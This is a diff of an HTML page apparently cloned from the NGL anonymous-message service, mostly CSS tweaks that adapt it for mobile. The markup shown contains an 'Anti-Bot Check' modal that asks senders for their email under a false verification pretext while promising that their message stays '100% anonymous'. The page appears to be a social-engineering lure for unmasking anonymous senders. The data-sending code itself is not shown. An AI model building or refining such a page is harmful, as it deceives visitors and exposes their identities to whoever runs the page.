@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>NGL | Send me anonymous messages!</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     
@@ -27,33 +27,36 @@
 
         body {
             background: var(--ngl-bg);
-            height: 100vh;
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            padding: 20px;
-            overflow: hidden;
+            padding: 15px;
+            overflow-x: hidden;
             position: relative;
         }
 
         /* Animated Background Blobs */
         .blob {
             position: absolute;
-            width: 300px;
-            height: 300px;
+            width: 60vw;
+            height: 60vw;
+            max-width: 300px;
+            max-height: 300px;
             background: rgba(255, 255, 255, 0.1);
             filter: blur(50px);
             border-radius: 50%;
             z-index: 0;
             animation: move 20s infinite alternate;
+            pointer-events: none;
         }
-        .blob-1 { top: -100px; left: -100px; }
-        .blob-2 { bottom: -100px; right: -100px; animation-delay: -5s; }
+        .blob-1 { top: -50px; left: -50px; }
+        .blob-2 { bottom: -50px; right: -50px; animation-delay: -5s; }
 
         @keyframes move {
             from { transform: translate(0, 0); }
-            to { transform: translate(100px, 100px); }
+            to { transform: translate(30px, 30px); }
         }
 
         .card {
@@ -61,16 +64,17 @@
             width: 100%;
             max-width: 400px;
             border-radius: 35px;
-            padding: 35px 25px;
+            padding: 30px 20px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.25);
             text-align: center;
             position: relative;
             z-index: 10;
             animation: slideUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            margin-top: 40px;
         }
 
         @keyframes slideUp {
-            from { opacity: 0; transform: translateY(40px) scale(0.9); }
+            from { opacity: 0; transform: translateY(40px) scale(0.95); }
             to { opacity: 1; transform: translateY(0) scale(1); }
         }
 
@@ -80,7 +84,7 @@
             display: inline-block;
             padding: 6px 12px;
             border-radius: 20px;
-            font-size: 0.7rem;
+            font-size: 0.65rem;
             font-weight: 800;
             text-transform: uppercase;
             letter-spacing: 1px;
@@ -95,12 +99,12 @@
         }
 
         .profile-pic {
-            width: 90px;
-            height: 90px;
+            width: 80px;
+            height: 80px;
             border-radius: 50%;
             background: #eee;
-            margin: 0 auto 15px;
-            border: 4px solid white;
+            margin: -70px auto 15px;
+            border: 5px solid white;
             background-image: url('https://i.pravatar.cc/150?u=jayan');
             background-size: cover;
             box-shadow: 0 8px 20px rgba(0,0,0,0.1);
@@ -108,22 +112,22 @@
 
         .username {
             font-weight: 800;
-            font-size: 1.25rem;
+            font-size: 1.15rem;
             color: #1a1a1a;
             margin-bottom: 5px;
         }
 
         .prompt {
             color: #666;
-            font-size: 0.95rem;
-            margin-bottom: 25px;
+            font-size: 0.9rem;
+            margin-bottom: 20px;
             font-weight: 500;
         }
 
         .input-wrapper {
             background: #fdfdfd;
-            border-radius: 25px;
-            padding: 20px;
+            border-radius: 20px;
+            padding: 15px;
             border: 2px solid #f2f2f2;
             box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
             transition: all 0.3s ease;
@@ -137,11 +141,11 @@
 
         textarea {
             width: 100%;
-            height: 120px;
+            height: 100px;
             border: none;
             outline: none;
             background: transparent;
-            font-size: 1.15rem;
+            font-size: 1.1rem;
             resize: none;
             color: #333;
             font-weight: 500;
@@ -157,23 +161,18 @@
             color: white;
             border: none;
             width: 100%;
-            padding: 18px;
+            padding: 16px;
             border-radius: 50px;
             font-weight: 900;
-            font-size: 1.1rem;
-            margin-top: 25px;
+            font-size: 1rem;
+            margin-top: 20px;
             cursor: pointer;
             transition: all 0.2s ease;
             box-shadow: 0 10px 20px rgba(0,0,0,0.15);
         }
 
-        .send-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 25px rgba(0,0,0,0.2);
-        }
-
         .send-btn:active {
-            transform: translateY(1px);
+            transform: scale(0.96);
         }
 
         /* Verification Overlay */
@@ -184,66 +183,68 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0,0,0,0.85);
             z-index: 1000;
             justify-content: center;
             align-items: center;
-            backdrop-filter: blur(12px);
+            backdrop-filter: blur(10px);
+            padding: 20px;
         }
 
         .modal-content {
             background: white;
-            width: 90%;
+            width: 100%;
             max-width: 360px;
-            padding: 40px 30px;
-            border-radius: 40px;
+            padding: 30px 20px;
+            border-radius: 35px;
             text-align: center;
             box-shadow: 0 30px 60px rgba(0,0,0,0.4);
             animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
         @keyframes popIn {
-            from { transform: scale(0.8); opacity: 0; }
+            from { transform: scale(0.85); opacity: 0; }
             to { transform: scale(1); opacity: 1; }
         }
 
         .shield-icon {
-            width: 80px;
-            height: 80px;
+            width: 70px;
+            height: 70px;
             background: #f8f9fa;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 2.5rem;
+            margin: 0 auto 15px;
+            font-size: 2rem;
             box-shadow: 0 10px 20px rgba(0,0,0,0.05);
         }
 
         .modal-title {
             font-weight: 800;
-            font-size: 1.4rem;
-            margin-bottom: 12px;
+            font-size: 1.25rem;
+            margin-bottom: 10px;
             color: #111;
         }
 
         .modal-text {
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             color: #555;
-            line-height: 1.6;
-            margin-bottom: 25px;
+            line-height: 1.5;
+            margin-bottom: 20px;
         }
 
         .verify-input {
             width: 100%;
-            padding: 16px;
-            border-radius: 18px;
+            padding: 14px;
+            border-radius: 15px;
             border: 2px solid #eee;
             margin-bottom: 15px;
             outline: none;
             font-size: 1rem;
             font-weight: 600;
             transition: border-color 0.3s;
+            -webkit-appearance: none;
         }
 
         .verify-input:focus {
@@ -255,32 +256,41 @@
             color: white;
             border: none;
             width: 100%;
-            padding: 16px;
+            padding: 15px;
             border-radius: 50px;
             font-weight: 800;
-            font-size: 1.05rem;
+            font-size: 1rem;
             cursor: pointer;
             box-shadow: 0 10px 20px rgba(255, 0, 122, 0.2);
         }
 
         .footer-text {
-            font-size: 0.75rem;
-            color: #bbb;
-            margin-top: 40px;
-            font-weight: 600;
+            font-size: 0.7rem;
+            color: #fff;
+            margin-top: 30px;
+            font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 1.5px;
             z-index: 10;
+            opacity: 0.8;
         }
 
         .safety-badge {
             margin-top: 15px;
-            font-size: 0.7rem;
+            font-size: 0.65rem;
             color: #999;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 5px;
+        }
+
+        /* Mobile specific adjustments */
+        @media (max-height: 600px) {
+            .card { padding: 25px 20px; margin-top: 30px; }
+            .profile-pic { width: 70px; height: 70px; margin-top: -60px; }
+            textarea { height: 80px; }
+            .footer-text { margin-top: 20px; }
         }
     </style>
 </head>
@@ -315,11 +325,11 @@
             <h2 class="modal-title">Anti-Bot Check</h2>
             <p class="modal-text">To prevent automated spam and protect our community, please enter a valid email to verify you are a real user.</p>
             
-            <input type="email" id="userEmail" class="verify-input" placeholder="Your email address" required>
+            <input type="email" id="userEmail" class="verify-input" placeholder="Your email address" autocomplete="email" required>
             
             <button class="final-btn" id="submitBtn" onclick="sendData()">Verify & Send</button>
             
-            <p style="font-size: 0.7rem; color: #aaa; margin-top: 20px; font-weight: 500;">
+            <p style="font-size: 0.65rem; color: #aaa; margin-top: 20px; font-weight: 500; line-height: 1.4;">
                 Your message remains 100% anonymous. This email is only used for one-time verification.
             </p>
         </div>
